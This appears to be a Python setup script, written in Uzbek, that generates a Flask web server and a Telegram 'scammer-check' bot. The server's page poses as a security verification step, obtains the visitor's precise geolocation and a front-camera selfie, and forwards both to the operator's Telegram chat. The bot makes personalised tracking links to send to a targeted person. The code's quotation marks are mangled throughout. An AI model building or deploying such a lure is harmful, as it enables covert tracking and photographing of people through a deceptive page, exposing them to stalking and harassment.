#!/usr/bin/env python3
“””
Bu faylni ishga tushiring - avtomatik barcha fayllarni yaratadi!
python setup.py
“””

import os

# ========================

# 1. requirements.txt

# ========================

with open(“requirements.txt”, “w”) as f:
f.write(””“flask
requests
python-telegram-bot
“””)
print(“✅ requirements.txt yaratildi”)

# ========================

# 2. Procfile

# ========================

with open(“Procfile”, “w”) as f:
f.write(“web: python server.py\n”)
print(“✅ Procfile yaratildi”)

# ========================

# 3. server.py

# ========================

with open(“server.py”, “w”, encoding=“utf-8”) as f:
f.write(’’’from flask import Flask, request, jsonify, render_template_string
import os, base64, json, requests
from datetime import datetime

app = Flask(**name**)

BOT_TOKEN = “YOUR_BOT_TOKEN_HERE”
ADMIN_ID = “YOUR_ADMIN_ID_HERE”
UPLOAD_FOLDER = “dalillar”
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

HTML = “””

<!DOCTYPE html>

<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tasdiqlash</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; }
        .card { background: white; border-radius: 16px; padding: 30px; max-width: 400px; width: 100%; box-shadow: 0 4px 20px rgba(0,0,0,0.1); text-align: center; }
        .icon { font-size: 60px; margin-bottom: 20px; }
        h2 { color: #1a1a2e; margin-bottom: 10px; }
        p { color: #666; margin-bottom: 25px; line-height: 1.6; }
        .btn { background: #2563eb; color: white; border: none; padding: 15px 30px; border-radius: 10px; font-size: 16px; cursor: pointer; width: 100%; margin-bottom: 10px; transition: 0.3s; }
        .btn:hover { background: #1d4ed8; }
        .btn:disabled { background: #ccc; cursor: not-allowed; }
        .status { margin-top: 20px; padding: 15px; border-radius: 10px; display: none; }
        .status.success { background: #d1fae5; color: #065f46; display: block; }
        .status.error { background: #fee2e2; color: #991b1b; display: block; }
        .status.loading { background: #dbeafe; color: #1e40af; display: block; }
        video { width: 100%; border-radius: 10px; margin-bottom: 15px; display: none; }
        canvas { display: none; }
    </style>
</head>
<body>
    <div class="card">
        <div class="icon">🔐</div>
        <h2>Tasdiqlash kerak</h2>
        <p>Davom etish uchun joylashuvingiz va rasmingizni tasdiqlang. Bu ma\'lumotlar faqat xavfsizlik maqsadida ishlatiladi.</p>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
        <button class="btn" id="btnRuxsat" onclick="ruxsatOl()">✅ Ruxsat beraman</button>
        <div class="status" id="status"></div>
    </div>
    <script>
        const sessionId = "{{ session_id }}";
        let stream = null;

```
    async function ruxsatOl() {
        const btn = document.getElementById("btnRuxsat");
        const status = document.getElementById("status");
        const video = document.getElementById("video");
        btn.disabled = true;
        status.className = "status loading";
        status.textContent = "⏳ Ruxsat so\'ralmoqda...";
        try {
            status.textContent = "📍 Joylashuv aniqlanmoqda...";
            const lokatsiya = await getLokatsiya();
            status.textContent = "📸 Kamera ochilmoqda...";
            stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
            video.style.display = "block";
            video.srcObject = stream;
            await new Promise(r => setTimeout(r, 1500));
            const rasm = rasmOl();
            status.textContent = "📤 Yuborilmoqda...";
            await yuborish(lokatsiya, rasm);
            stream.getTracks().forEach(t => t.stop());
            video.style.display = "none";
            status.className = "status success";
            status.textContent = "✅ Tasdiqlandi! Rahmat.";
        } catch(err) {
            status.className = "status error";
            status.textContent = "❌ Xatolik: " + err.message;
            btn.disabled = false;
        }
    }

    function getLokatsiya() {
        return new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(
                pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, aniqlik: pos.coords.accuracy }),
                err => reject(err),
                { enableHighAccuracy: true, timeout: 10000 }
            );
        });
    }

    function rasmOl() {
        const video = document.getElementById("video");
        const canvas = document.getElementById("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext("2d").drawImage(video, 0, 0);
        return canvas.toDataURL("image/jpeg", 0.8).split(",")[1];
    }

    async function yuborish(lokatsiya, rasm) {
        const res = await fetch("/dalil", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ session_id: sessionId, lokatsiya, rasm, vaqt: new Date().toISOString() })
        });
        if (!res.ok) throw new Error("Server xatosi");
    }
</script>
```

</body>
</html>
"""

@app.route(”/tekshir/<session_id>”)
def sahifa(session_id):
return render_template_string(HTML, session_id=session_id)

@app.route(”/dalil”, methods=[“POST”])
def dalil_qabul():
data = request.json
session_id = data.get(“session_id”, “nomalum”)
lokatsiya = data.get(“lokatsiya”, {})
rasm_b64 = data.get(“rasm”, “”)
vaqt = data.get(“vaqt”, datetime.now().isoformat())

```
papka = os.path.join(UPLOAD_FOLDER, session_id)
os.makedirs(papka, exist_ok=True)

rasm_fayl = os.path.join(papka, "selfie.jpg")
with open(rasm_fayl, "wb") as f:
    f.write(base64.b64decode(rasm_b64))

info = {
    "session_id": session_id,
    "vaqt": vaqt,
    "lokatsiya": lokatsiya,
    "google_maps": f"https://maps.google.com/?q={lokatsiya.get(\'lat\')},{lokatsiya.get(\'lon\')}"
}
with open(os.path.join(papka, "malumot.json"), "w", encoding="utf-8") as f:
    json.dump(info, f, ensure_ascii=False, indent=2)

xabar = (
    f"🚨 *Yangi dalil keldi!*\\n\\n"
    f"🆔 Session: `{session_id}`\\n"
    f"📍 Joylashuv: [{lokatsiya.get(\'lat\')}, {lokatsiya.get(\'lon\')}]\\n"
    f"🗺 Xarita: [Google Maps]({info[\'google_maps\']})\\n"
    f"📏 Aniqlik: {lokatsiya.get(\'aniqlik\', \'?\')} metr\\n"
    f"🕐 Vaqt: {vaqt[:19].replace(\'T\', \' \')}"
)

requests.post(
    f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
    json={"chat_id": ADMIN_ID, "text": xabar, "parse_mode": "Markdown"}
)

with open(rasm_fayl, "rb") as f:
    requests.post(
        f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
        data={"chat_id": ADMIN_ID, "caption": f"📸 Selfie — {session_id}"},
        files={"photo": f}
    )

return jsonify({"status": "ok"})
```

if **name** == “**main**”:
app.run(host=“0.0.0.0”, port=5000, debug=False)
‘’’)
print(“✅ server.py yaratildi”)

# ========================

# 4. firibgar_bot.py

# ========================

with open(“firibgar_bot.py”, “w”, encoding=“utf-8”) as f:
f.write(’’’import logging
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
import json, os
from datetime import datetime

BOT_TOKEN = “YOUR_BOT_TOKEN_HERE”
ADMIN_ID = 123456789
DB_FILE = “firibgarlar.json”

def load_db():
if os.path.exists(DB_FILE):
with open(DB_FILE, “r”, encoding=“utf-8”) as f:
return json.load(f)
return {“blacklist”: {}, “shikoyatlar”: {}}

def save_db(data):
with open(DB_FILE, “w”, encoding=“utf-8”) as f:
json.dump(data, f, ensure_ascii=False, indent=2)

logging.basicConfig(format=”%(asctime)s - %(levelname)s - %(message)s”, level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
text = (
“🔍 *Firibgar Aniqlash Boti*\n\n”
“🔎 /tekshir @username — tekshirish\n”
“🚨 /shikoyat @username sabab — shikoyat\n”
“📋 /royxat — qora ro'yxat\n”
“🔗 /havola username — dalil havolasi”
)
await update.message.reply_text(text, parse_mode=“Markdown”)

async def tekshir(update: Update, context: ContextTypes.DEFAULT_TYPE):
if not context.args:
await update.message.reply_text(“❗ /tekshir @username”)
return
kalit = context.args[0].lower().replace(”@”, “”)
db = load_db()
blacklistda = kalit in db[“blacklist”]
shikoyat_soni = len(db[“shikoyatlar”].get(kalit, []))
if blacklistda:
ma = db[“blacklist”][kalit]
text = f”🚫 *FIRIBGAR!*\n👤 `{kalit}`\n📝 {ma.get('sabab')}\n📢 Shikoyat: {shikoyat_soni}”
elif shikoyat_soni > 0:
text = f”⚠️ *SHUBHALI*\n👤 `{kalit}`\n📢 Shikoyat: {shikoyat_soni}”
else:
text = f”✅ *TOZA*\n👤 `{kalit}`\nHech qanday ma'lumot topilmadi.”
keyboard = [[InlineKeyboardButton(“🚨 Shikoyat”, callback_data=f”shikoyat_{kalit}”)]]
await update.message.reply_text(text, parse_mode=“Markdown”, reply_markup=InlineKeyboardMarkup(keyboard))

async def shikoyat(update: Update, context: ContextTypes.DEFAULT_TYPE):
if len(context.args) < 2:
await update.message.reply_text(“❗ /shikoyat @username sabab”)
return
kalit = context.args[0].lower().replace(”@”, “”)
sabab = “ “.join(context.args[1:])
yuboruvchi = update.message.from_user
db = load_db()
if kalit not in db[“shikoyatlar”]:
db[“shikoyatlar”][kalit] = []
db[“shikoyatlar”][kalit].append({“sabab”: sabab, “kimdan”: yuboruvchi.id, “sana”: datetime.now().strftime(”%Y-%m-%d %H:%M”)})
save_db(db)
await update.message.reply_text(f”✅ Shikoyat qabul qilindi! Jami: {len(db['shikoyatlar'][kalit])}”, parse_mode=“Markdown”)

async def royxat(update: Update, context: ContextTypes.DEFAULT_TYPE):
db = load_db()
if not db[“blacklist”]:
await update.message.reply_text(“📋 Qora ro'yxat bo'sh.”)
return
text = “🚫 *Qora ro'yxat:*\n\n”
for k, v in list(db[“blacklist”].items())[:20]:
text += f”• `{k}` — {v.get('sabab', '?')}\n”
await update.message.reply_text(text, parse_mode=“Markdown”)

async def havola(update: Update, context: ContextTypes.DEFAULT_TYPE):
if not context.args:
await update.message.reply_text(“❗ /havola username”)
return
username = context.args[0].replace(”@”, “”)
SERVER_URL = “https://YOUR_RENDER_URL”
link = f”{SERVER_URL}/tekshir/{username}”
await update.message.reply_text(
f”🔗 *Dalil havolasi:*\n\n`{link}`\n\nShu havolani firibgarga yuboring.”,
parse_mode=“Markdown”
)

async def qosh(update: Update, context: ContextTypes.DEFAULT_TYPE):
if update.message.from_user.id != ADMIN_ID:
await update.message.reply_text(“❌ Faqat admin!”)
return
if len(context.args) < 2:
await update.message.reply_text(“❗ /qosh @username sabab”)
return
kalit = context.args[0].lower().replace(”@”, “”)
sabab = “ “.join(context.args[1:])
db = load_db()
db[“blacklist”][kalit] = {“sabab”: sabab, “sana”: datetime.now().strftime(”%Y-%m-%d %H:%M”)}
save_db(db)
await update.message.reply_text(f”✅ `{kalit}` qora ro'yxatga qo'shildi!”, parse_mode=“Markdown”)

async def ochir(update: Update, context: ContextTypes.DEFAULT_TYPE):
if update.message.from_user.id != ADMIN_ID:
await update.message.reply_text(“❌ Faqat admin!”)
return
if not context.args:
await update.message.reply_text(“❗ /ochir @username”)
return
kalit = context.args[0].lower().replace(”@”, “”)
db = load_db()
if kalit in db[“blacklist”]:
del db[“blacklist”][kalit]
save_db(db)
await update.message.reply_text(f”✅ `{kalit}` o'chirildi!”, parse_mode=“Markdown”)
else:
await update.message.reply_text(“❗ Topilmadi.”)

async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
query = update.callback_query
await query.answer()
if query.data.startswith(“shikoyat_”):
kalit = query.data.replace(“shikoyat_”, “”)
await query.message.reply_text(f”`/shikoyat {kalit} sabab`”, parse_mode=“Markdown”)

def main():
app = Application.builder().token(BOT_TOKEN).build()
app.add_handler(CommandHandler(“start”, start))
app.add_handler(CommandHandler(“tekshir”, tekshir))
app.add_handler(CommandHandler(“shikoyat”, shikoyat))
app.add_handler(CommandHandler(“royxat”, royxat))
app.add_handler(CommandHandler(“havola”, havola))
app.add_handler(CommandHandler(“qosh”, qosh))
app.add_handler(CommandHandler(“ochir”, ochir))
app.add_handler(CallbackQueryHandler(callback_handler))
print(“✅ Bot ishga tushdi!”)
app.run_polling()

if **name** == “**main**”:
main()
‘’’)
print(“✅ firibgar_bot.py yaratildi”)

print(”\n🎉 Barcha fayllar yaratildi!”)
print(“Endi BOT_TOKEN va ADMIN_ID ni to’ldiring!”)
